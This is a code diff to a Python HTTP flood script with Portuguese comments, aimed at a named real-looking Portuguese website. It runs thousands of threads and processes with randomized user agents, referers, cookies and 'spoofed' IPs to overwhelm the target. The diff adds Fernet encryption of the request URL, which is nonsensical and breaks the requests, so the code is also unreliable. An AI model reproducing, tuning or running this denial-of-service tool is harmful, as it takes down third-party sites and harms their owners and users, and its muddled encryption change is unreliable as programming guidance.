@@ -1,10 +1,10 @@
+from cryptography.fernet import Fernet
 import requests
 import threading
 import multiprocessing
 import random
 import time
 import string
-import socket
 
 # Lista de user agents e referers
 user_agents = [
@@ -57,6 +57,10 @@ referers = [
     "http://www.pinterest.com",
 ]
 
+# Chave de criptografia (mantenha a mesma chave para criptografar e descriptografar)
+key = Fernet.generate_key()
+cipher = Fernet(key)
+
 # Função para gerar um IP spoofed aleatório
 def generate_random_ip():
     return ".".join(str(random.randint(0, 255)) for _ in range(4))
@@ -65,7 +69,7 @@ def generate_random_ip():
 def generate_random_cookie(length=20):
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
 
-# Função de ataque com IP spoofed randomizado
+# Função de ataque com IP spoofed randomizado e criptografia
 def flood(target_url, duration):
     start_time = time.time()
     while time.time() - start_time < duration:
@@ -102,16 +106,21 @@ def flood(target_url, duration):
             # Acessa páginas adicionais no site alvo
             page = random.choice(["page1", "page2", "page3"])
             url = f"{target_url}/{page}"
-            response = session.get(url)
+
+            # Criptografa a URL
+            encrypted_url = cipher.encrypt(url.encode())
+
+            # Envia a requisição
+            response = session.get(encrypted_url)
             print(f"Request sent to {url}, Response code: {response.status_code}")
         except requests.exceptions.RequestException as e:
             print(f"An error occurred: {e}")
 
 # Configurações do ataque
 target_url = "https://agrcbt.pt/"
-duration = 700013
-num_threads = 8024
-num_processes = 6024
+duration = 600
+num_threads = 4024
+num_processes = 4024
 
 # Inicia os threads e processos
 threads = []
